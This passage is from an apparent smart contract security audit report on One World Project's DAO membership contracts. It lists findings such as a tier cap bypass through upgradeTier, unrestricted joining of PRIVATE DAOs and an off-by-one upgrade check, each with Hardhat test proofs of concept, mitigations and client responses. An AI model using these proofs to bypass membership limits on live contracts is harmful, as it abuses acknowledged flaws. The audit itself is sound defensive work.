**Description:** If the DAO specified by the `daoMembershipAddress` parameter in a call to `MembershipFactory::upgradeTier` is registered as [`SPONSORED`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L139), members can upgrade their tier by burning two lower tier tokens for one higher tier token. However, the [`tiers.minted`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L35) member of [`MembershipDAOStructs::DAOConfig`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L16) is not updated or validated against the configured [`tiers.amount`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L32), meaning that a DAO member can mint more higher tier tokens than intended by minting lower tier tokens and upgrading them.

**Impact:** The maximum number of memberships for a given tier can be circumvented by upgrading lower tier. Additionally, since `tiers.minted` is not decremented/incremented for the original and upgraded tiers respectively, no new tokens will be able to be minted for the lower tier.

**Proof of Concept:** The following test can be added to `describe("Upgrade Tier")` in `MembershipFactory.test.ts`:

```javascript
it("can upgrade above max amount and minted not updated", async function () {
  const lowTier = 5;
  const highTier = 4;
  await testERC20.mint(addr1.address, ethers.utils.parseEther("1000000"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("1000000"));
  for(let i = 0; i < 40; i++) {
    await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, highTier);
  }
  // cannot join anymore
  await expect(membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, highTier)).to.be.revertedWith("Tier full.");

  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, lowTier);
  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, lowTier);

  const tiersBefore = await membershipFactory.daoTiers(membershipERC1155.address);
  expect(tiersBefore[lowTier].minted).to.equal(2);
  expect(tiersBefore[highTier].minted).to.equal(40);

  // but can upgrade tier
  await membershipFactory.connect(addr1).upgradeTier(membershipERC1155.address, lowTier);

  // a total of 41 tokens for tier 4, max amount is 40
  const numberOfTokens = await membershipERC1155.balanceOf(addr1.address, highTier);
  expect(numberOfTokens).to.equal(41);

  // and minted hasn't changed
  const tiersAfter = await membershipFactory.daoTiers(membershipERC1155.address);
  expect(tiersAfter[lowTier].minted).to.equal(tiersBefore[lowTier].minted);
  expect(tiersAfter[highTier].minted).to.equal(tiersBefore[highTier].minted);
});
```

**Recommended Mitigation:** The `tiers.minted` member should be decremented for the original tier and incremented for the upgraded tier, validating that `tier.amount` is not exceeded.

**One World Project:** This is a business logic requirement. We have to allow upgradation even after the tier is full. So, the total minted will remain how many were minted, but the upgraded members will be above and beyond that

**Cyfrin:** Acknowledged.


### No membership restrictions placed on `PRIVATE` DAOs allows anyone to join

**Description:** [`MembershipDAOStructs::DAOType`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L6-L10) exposes the different types a DAO can have, namely `PRIVATE`, `SPONSORED`, and the default `PUBLIC` which has no restrictions. DAOs of type `SPONSORED` are open but require the use of all tiers, and while `PRIVATE` may be expected to impose further limitations on membership, this case is not handled and so it is possible for anyone to join these DAOs.

**Impact:** Even if a DAO creator specifies `DAOType.PRIVATE`, there is no possibility to place restrictions on which accounts are allowed to join.

**Proof of Concept:** The following test can be added to `describe("Create New DAO Membership")` in `MembershipFactory.test.ts`:
```javascript
it("lets anyone join PRIVATE DAOs", async function () {
  await currencyManager.addCurrency(testERC20.address);

  // DAO membership is private
  DAOConfig.daoType = DAOType.PRIVATE;
  await membershipFactory.createNewDAOMembership(DAOConfig, TierConfig);

  const ensAddress = await membershipFactory.getENSAddress("testdao.eth");
  const membershipERC1155 = await MembershipERC1155.attach(ensAddress);

  await testERC20.mint(addr1.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("20"));

  // but anyone can join
  await expect(membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;
});
```

**Recommended Mitigation:** Consider implementing an allowlist option or similar that the creator of a `PRIVATE` DAO can use to enforce membership restrictions.

**One World Project:** There are no intentions to disallow anyone from joining the private DAOs in smart contract, they are just mentioned that way to be obscured from public view in the website.

**Cyfrin:** Acknowledged.


### DAO membership can exceed `MembershipDAOStructs::DAOConfig.maxMembers`

**Description:** The [`MembershipDAOStructs::DAOConfig.maxMembers`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L18) field is intended as a cap to DAO membership, beyond which should not be exceeded; however, this is currently unused and there is no limit on how many members can join a DAO besides the limit for each respective tier.

**Impact:** Any number of members can join a DAO, limited only by the maximum amount for each tier.

**Proof of Concept:** The following test can be added to `describe("Create New DAO Membership")` in `MembershipFactory.test.ts`:
```javascript
it("can exceed maxMembers", async function () {
  // max members is 1
  DAOConfig.maxMembers = 1;
  await currencyManager.addCurrency(testERC20.address);
  await membershipFactory.createNewDAOMembership(DAOConfig, TierConfig);

  const ensAddress = await membershipFactory.getENSAddress("testdao.eth");
  const membershipERC1155 = await MembershipERC1155.attach(ensAddress);

  await testERC20.mint(addr1.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("20"));
  await testERC20.mint(addr2.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr2).approve(membershipFactory.address, ethers.utils.parseEther("20"));

  // two members can join
  await expect(membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;
  await expect(membershipFactory.connect(addr2).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;
});
```

**Recommended Mitigation:** Consider validating the amount of members who have joined a DAO and enforce no more than `maxMembers`.

**One World Project:** maxMembers is only for data verification in backend. Updated the value acc to new data. Fixed in [`e60b078`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/e60b078f09d4ed0f1e509f36a2a6d42293815737) and [`510f305`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/510f305e24a89e0815934ab257a413b9e835607f)

**Cyfrin:** Verified. The sum of `tier.amount` cannot surpass `maxMembers` and `tier.amount` is validated when joining.


### Lowest tier (highest index) membership cannot be upgraded

**Description:** For `SPONSORED` DAOs, members are permitted to upgrade from a lower tier membership to a higher tier by burning two tokens within a call to [`MembershipFactory::upgradeTier`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L135-L144). This logic attempts to [validate](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L140) that the current tier can be upgraded:

```solidity
require(daos[daoMembershipAddress].noOfTiers > fromTierIndex + 1, "No higher tier available.");
```

However, one important detail here to note is that the highest tier membership has the lowest tier index when [referenced](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L140-L142) within `MembershipFactory::upgradeTier`. Hence, the highest tier is denoted by `0` and the lowest tier with the highest index, `6`, meaning that the above validation is off-by-one. `7 > 6 + 1` is `false` and it is not possible to upgrade from the lowest tier (highest index) membership. Also note that attempted upgrades from the highest tier (lowest index) fail only due to a [revert on underflow](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L142) when attempting to mint.

**Impact:** DAO members cannot upgrade the lowest tier memberships to higher tiers.

**Proof of Concept:** The following test can be added to `describe("Upgrade Tier")` in `MembershipFactory.test.ts`:
```javascript
it("cannot upgrade from lowest tier, highest index", async function () {
  const fromTierIndex = 6;
  await testERC20.mint(addr1.address, ethers.utils.parseEther("1000000"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("1000000"));

  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, fromTierIndex);
  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, fromTierIndex);

  // cannot upgrade from highest index, lowest tier, because of off-by-one
  await expect(membershipFactory.connect(addr1).upgradeTier(membershipERC1155.address, fromTierIndex)).to.be.revertedWith("No higher tier available.");
});
```

**Recommended Mitigation:** Remove the `+ 1`:

```diff
-    require(daos[daoMembershipAddress].noOfTiers > fromTierIndex + 1, "No higher tier available.");
+    require(daos[daoMembershipAddress].noOfTiers > fromTierIndex, "No higher tier available.");
```

**One World Project:** Fixed in [`0a94d44`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/0a94d44bd51b69bbaa2a624f545bdebff0785535).

**Cyfrin:** Verified. Comparison is now `>=`.


### DAO members have no option to leave

**Description:** `MembershipFactory` exposes methods to join a DAO and upgrade tiers within a `SPONSORED` type DAO; however, there is no logic directly exposed to DAO members to burn their membership token(s) if they decide to leave the DAO. The only role with permissions to execute this is `EXTERNAL_CALLER` who can do so on behalf of the user, presumably at their request.

**Impact:** DAO members cannot leave without the cooperation of `EXTERNAL_CALLER`.

**Recommended Mitigation:** Consider exposing burn logic directly to DAO members so they have the option to leave.

**One World Project:** There is intentionally no process in place for a member to exit the DAO as per business logic. They can be removed by burning their Membership NFTs through off-chain process by the `EXTERNAL_CALLER`.

**Cyfrin:** Acknowledged. This dependency introduces additional risks, and we recommend ensuring the off-chain service meets stringent security standards.

\clearpage
## Low Risk


### `MembershipERC1155` should use OpenZeppelin upgradeable base contracts

**Description:** `MembershipERC1155` is an implementation contract intended for use with `TransparentUpgradeableProxy`, controlled via an instance of `ProxyAdmin`; however, it does not utilize the OpenZeppelin upgradeable contracts which are designed to avoid storage collisions between upgrades.

**Impact:** Upgrading the contract with new OpenZeppelin libraries can lead to storage collisions.

**Recommended Mitigation:** Consider using the upgradeable versions of `ERC1155`, `AccessControl` and `Initializable`.

**One World Project:** Updated the openzeppelin version, and solidity version. Had to change some functions due to change in openzeppelin’s contracts in [`1c3e820`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/1c3e820adc53d977cd2337af1c2d524fc1ac2782).

**Cyfrin:** Verified. `MembershipERC1155` now uses upgradeable versions of OpenZeppelin contracts. OpenZeppelin library version upgraded as well.


### State update performed after external call in `MembershipERC1155::mint`

**Description:** When `MembershipERC1155::mint` is invoked during a call to `MembershipFactory::joinDAO`, the `totalSupply` increment is performed after the call to `ERC1155::_mint`:

```solidity
function mint(address to, uint256 tokenId, uint256 amount) external override onlyRole(OWP_FACTORY_ROLE) {
    _mint(to, tokenId, amount, "");
    totalSupply += amount * 2 ** (6 - tokenId); // Update total supply with weight
}
```

While there does not appear to be any immediate impact, this is in violation of the Checks-Effects-Interactions (CEI) pattern and thus potentially unsafe due to the [invocation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/token/ERC1155/ERC1155.sol#L285) of [`ERC1155::_doSafeTransferAcceptanceCheck`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/token/ERC1155/ERC1155.sol#L467-L486):

```solidity
if (to.isContract()) {
    try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {
        if (response != IERC1155Receiver.onERC1155Received.selector) {
            revert("ERC1155: ERC1155Receiver rejected tokens");
        }
```

**Impact:** There does not appear to be any immediate impact, although any code executed within a receiver smart contract will work with an incorrect `totalSupply` state.

**Recommended Mitigation:** Consider increasing the `totalSupply` before the call to `_mint()`.

**One World Project:** Updated the pattern in [`30465a3`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/30465a3197adea883413298a9ac17fe8a1f0289e).

**Cyfrin:** Verified. State changes now done before external call is made.


### `TierConfig::price` is not validated to follow `TierConfig::power` which itself is not used or validated

**Description:** When creating a new DAO membership, the creator can specify a [`TierConfig::power`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L34); however, this value is never used or validated and is assumed to be `2` throughout the codebase, for example in `MembershipFactory::upgradeTier` where it is assumed that two lower tier tokens can be burnt for one higher tier token:

```solidity
IMembershipERC1155(daoMembershipAddress).burn(msg.sender, fromTierIndex, 2);
IMembershipERC1155(daoMembershipAddress).mint(msg.sender, fromTierIndex - 1, 1);
```

And in [`MembershipERC1155::shareOf`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L165-L176) where the multipliers are hardcoded:

```solidity
function shareOf(address account) public view returns (uint256) {
    return (balanceOf(account, 0) * 64) +
           (balanceOf(account, 1) * 32) +
           (balanceOf(account, 2) * 16) +
           (balanceOf(account, 3) * 8) +
           (balanceOf(account, 4) * 4) +
           (balanceOf(account, 5) * 2) +
           balanceOf(account, 6);
}
```

In addition to this, the `TierConfig::price` is never validated to actually increase with the `TierConfig::power` in both [`MembershipFactory::createNewDAOMembership`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L56) or [`MembershipFactory::updateDAOMembership`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L94):

```solidity
for (uint256 i = 0; i < tierConfigs.length; i++) {
    dao.tiers.push(tierConfigs[i]);
}
```

Therefore, DAOs can be created with prices that do not adhere to either `power` specification. Since the `power` is assumed to be `2` in `MembershipFactory::upgradeTier`, this could result in upgrades being cheaper than intended.

**Impact:** The `power` configuration sent by the DAO creator is not used and assumed to be `2` throughout. `TierConfig::price` is also not validated to actually follow the `power` provided.

**Recommended Mitigation:** Consider using and validating `TierConfig::power` where mentioned above.

**One World Project:** This is acc. To the business logic. The upgradation always takes 2 NFTs from lower tier to mint one higher tier one. The power, among other values, is customizable by the dao creator, but it is kept in contract only for off chain validation and has no direct use in the contract.

**Cyfrin:** Acknowledged.


### DAOs of all types can be updated with a lower number of tiers and are not validated to be above zero

**Description:** When creating a new DAO membership in `MembershipFactory::createNewDAOMembership`, the tiers are [validated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L60) to be non-zero and not exceed the maximum after parallel data structures are [validated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L59) to be equal:

```solidity
require(daoConfig.noOfTiers == tierConfigs.length, "Invalid tier input.");
require(daoConfig.noOfTiers > 0 && daoConfig.noOfTiers <= 7, "Invalid tier count.");
```

For `SPONSORED` DAOs, the number of tiers is [validated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L62-L64) to be equal to the maximum:

```solidity
if (daoConfig.daoType == DAOType.SPONSORED) {
    require(daoConfig.noOfTiers == 7, "Invalid tier count for sponsored.");
}
```

However, there is no such validation when `MembershipFactory::updateDAOMembership` is called, aside from the [cap](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L97) on the number of tiers.

**Impact:** DAOs of all types can be effectively closed by updating the number of tiers to zero.

**Recommended Mitigation:** Consider retaining the original validation if this behavior is not intended, ensuring that the number of tiers remains above zero for all DAOs and that `SPONSORED` DAOs must have the maximum number of tiers.

**One World Project:** Added checks in [`1b05816`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/1b05816da53ecefa02483141eeef689b331b328d).

**Cyfrin:** Verified. `tiers` is now checked to be `> 0` and if DAO is `SPONSORED` to equal to `7`.


### `NativeMetaTransaction::executeMetaTransaction` is unnecessarily `payable`

**Description:** `NativeMetaTransaction::executeMetaTransaction` is marked [`payable`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L33-L39) but, unlike the [OpenZeppelin implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/metatx/MinimalForwarder.sol#L55), the [`low-level call`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L62-L64) in the function body does not forward any native token. Hence, any native token balance sent as part of the transaction will be stuck in the implementing contract.

**Impact:** In the case of `MembershipFactory`, native token balances can be rescued by the `EXTERNAL_CALLER` role, but for `OWPIdentity` any native token would be stuck forever.

**Recommended Mitigation:** Consider removing `payable` from `NativeMetaTransaction::executeMetaTransaction`, since native token is not used in any of the contracts and so it is not needed.

There is also [a comment](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L22-L23) about the `MetaTransactionStruct` that could then be reworded to say  _"value isn't included because it is not used in the implementing contracts"_.

**One World Project:** Updated in [`e60b078`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/e60b078f09d4ed0f1e509f36a2a6d42293815737)

**Cyfrin:** Verified. `msg.value` is now forwarded.

\clearpage
## Informational


### `MembershipERC1155` implementation contract can be initialized

**Description:** `MembershipERC1155` is an implementation contract intended to be used with the Transparent upgradeable proxy pattern; however, it can be initialized since the `initialize()` function can be called by anyone.

**Impact:** This cannot be abused in any way other than initializing the implementation contract, which does not affect the proxy but may be confusing for consumers.

**Recommended Mitigation:** Consider invoking [`Initializable::_disableInitializers`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/72c152dc1c41f23d7c504e175f5b417fccc89426/contracts/proxy/utils/Initializable.sol#L184-L203) within the body of the constructor.

**One World Project:** Added in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `_disabledInitializers()` is now called in the constructor.


### Consider making `MembershipERC1155::totalSupply` `public`

**Description:** The [`totalSupply`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L23) variable in the `MembershipERC1155` contract is currently marked as `private`:

```solidity
uint256 private totalSupply;
```

As this state variable could be valuable for off-chain computations, it is recommended to consider making it `public` for easier access.

**One World Project:** Updated in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `totalSupply` is now public.


### Mixed use of `uint` and `uint256` in `MembershipERC1155`

**Description:** The state declarations in `MembershipERC1155` use both `uint` and `uint256`:

```solidity
mapping(address => uint256) public totalProfit;
mapping(address => mapping(address => uint)) internal lastProfit;
mapping(address => mapping(address => uint)) internal savedProfit;

uint256 internal constant ACCURACY = 1e30;

event Claim(address indexed account, uint amount);
event Profit(uint amount);
```

This is inconsistent and confusing. Consider using `uint256` everywhere as this is more expressive.

**One World Project:** Updated in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `uint256` is now used.


### Unnecessary storage gap in `MembershipERC1155` can be removed

**Description:** `MembershipERC1155` declares a [storage gap](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L212-L213) at the very end of the contract:

```solidity
uint256[50] private __gap;
```

Such gaps are intended for use by abstract base contracts as they allow state variables to be added to the contract storage layout without "shifting down" the total number of utilized storage slots and thus potentially causing storage collisions in the inheriting contract.

`MembershipERC1155` is not intended to be used as a base contract inherited by other contracts and so has no need for a storage gap, meaning the one present is unnecessary and can be removed.

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `__gap` has been removed.


### `MembershipFactory::owpWallet` lacks explicitly declared visibility

**Description:** [`MembershipFactory::owpWallet`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L20) has no declared visibility:

```solidity
address owpWallet;
```

This gives it the default `internal` visibility; however, it is best practice to explicitly specify the visibility for state variables in the contract.

**One World Project:** Made public in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `owpWallet` is public.



### Unnecessarily complex `ProxyAdmin` ownership setup

**Description:** The `ProxyAdmin` contract is created in the `MembershipFactory` constructor:

```solidity
constructor(address _currencyManager, address _owpWallet, string memory _baseURI, address _membershipImplementation) {
    // ...
    proxyAdmin = new ProxyAdmin();
```

`ProxyAdmin` inherits `Ownable` and sets the contract owner to `msg.sender`, meaning that this will be the `MembershipFactory` contract.

This ownership structure is further complicated by the requirement for the `EXTERNAL_CALLER` role to call `MembershipFactory::callExternalContract` when managing proxy upgrades. A simpler solution would be to deploy the `ProxyAdmin` independently and pass its address to the `MembershipFactory` constructor.

**Recommended Mitigation:** Consider deploying a separate instance of `ProxyAdmin` and passing its address as a constructor parameter, allowing the ownership structure to be less complex and easier to manage.

**One World Project:** Acknowledged. Intentional. Kept as it is.

**Cyfrin:** Acknowledged.


### Upgrading DAO tier emits same event as minting the same tier

**Description:** If a DAO is registered as SPONSORED, its members can upgrade their membership tier by burning two lower tier tokens for one higher tier token in a call to `MembershipFactory::upgradeTier`.

This will [emit](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L143) the `UserJoinedDAO` event which is the same as that emitted when joining a DAO for the first time, making it impossible to differentiate between these two actions.

**Recommended Mitigation:** Consider emitting a separate event when a DAO member upgrades their tier.

**One World Project:** Upgrading mints a new token in a new tier, so same event is kept to track events efficiently in backend.

**Cyfrin:** Acknowledged.


### Inconsistent indentation formatting in `CurrencyManager`

**Description:** The indentation in `CurrencyManager` is 2 spaces while the indentation for the rest of the codebase is 4 spaces.

**Recommended Mitigation:** Consider formatting `CurrencyManager` to be consistent with the 4 space indentation convention.

**One World Project:** Acknowledged.

**Cyfrin:** Acknowledged.


### Unused variables should be used or removed

**Description:** There following variables are declared but unused throughout the codebase:

* [`MembershipDAOStructs::UINT64_MAX`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L4)
* [`MembershipERC1155::deployer`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L21)
* [`CurrencyManager::admin`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/CurrencyManager.sol#L21)

Consider using or removing these variables.

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. The above variables have all been removed.


### Incorrect `EIP712Base` constructor documentation

**Description:** [This comment](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/EIP712Base.sol#L21-L29) documenting the `EIP712` constructor is incorrect:

```solidity
// supposed to be called once while initializing.
// one of the contractsa that inherits this contract follows proxy pattern
// so it is not possible to do this in a constructor
```

The only contract in the project using a proxy pattern is `MembershipERC1155` which does not inherit `EIP712Base` directly or otherwise. Hence, the comment is not needed.

There is also a typo:

```diff
-  // one of the contractsa that inherits this contract follows proxy pattern
+  // one of the contracts that inherits this contract follows proxy pattern
```

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. The documentation is now removed.


### `chainId` is used as the `EIP712Base::EIP712Domain.salt` in `DOMAIN_TYPEHASH`

**Description:** `EIP712Base` implements EIP-712; however, there is a mistake in the definition of [`DOMAIN_TYPEHASH`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/EIP712Base.sol#L38) where `chainId` is used as the `salt` parameter.

According to the [EIP-712 specification](https://eips.ethereum.org/EIPS/eip-712#definition-of-domainseparator), the salt should only be used in the `DOMAN_TYPEHASH` as a last resort.

The `chainId` parameter should be used, but rather as a raw chain identifier as done in the OpenZeppelin [EIP-712](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/EIP712.sol#L37-L39) implementation:

```solidity
bytes32 private constant TYPE_HASH =
    keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
```

Consider changing the `DOMAIN_TYPEHASH` to use `chainId` instead of `salt`, or use the OpenZeppelin library directly.

**One World Project:** Intentional. Kept as it is.

**Cyfrin:** Acknowledged.


### Tier indexing is confusing

**Description:** Throughout `MembershipERC1155`, the [highest tier](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L169-L175) membership is referred to with the lowest tier index. To consider an example, for a DAO with `6` tiers, the lowest index `0` should be passed to mint the highest tier membership while the highest index `6` should be passed to mint the lowest tier membership.

This is very confusing and can cause issues for users or third-party integrations. Consider reversing this convention such that the highest tier index corresponds to the highest tier membership, and vice versa.

**One World Project:** Intentional. Tier 0 (Tier 1 in website) is at the highest level. Tier 6 (Tier 7 in website) is lowest.

**Cyfrin:** Acknowledged.


### `MembershipFactory::tiers` will almost always return incorrect state

**Description:** [`MembershipFactory::tiers`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L45-L50) exposes the [`_tiers`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L23) mapping for external consumption, containing specifically the important [`minted`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L35) state member that indicates how many membership tokens have been minted for a given tier; however, it is not updated in either `MembershipFactory::joinDAO`, unlike the [parallel data structure](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L128), or `MembershipFactory::upgradeTier`, where both state updates are missing. This means that only the [initial configuration state](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L85) will be returned, unless a call is made to `MembershipFactory::updateDAOMembership` in which case the the mappings for a given DAO are [synchronized](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L114). Again, this will only be correct until another membership is minted, after which the actual number of tokens minted for a given tier will exceed that stored in the mapping.

**Recommended Mitigation:** Consider updating both parallel data structures appropriately. Assuming other state update issues are fixed, the [`daos`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L22) mapping could be used to return the correct state; however, this would require either modifying `MembershipFactory::tiers` to return the `daos.tiers` array or implementing a separate call to query a specific array as the public mapping will not return it by default when simply querying `daos()`. In this case, the `_tiers` mapping is redundant and can be completely removed.

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `_tiers` is removed and `MembershipFactory::tiers` now returns the `dao.tiers` array.


### The Beacon proxy pattern is better suited to upgrading multiple instances of `MembershipERC1155`

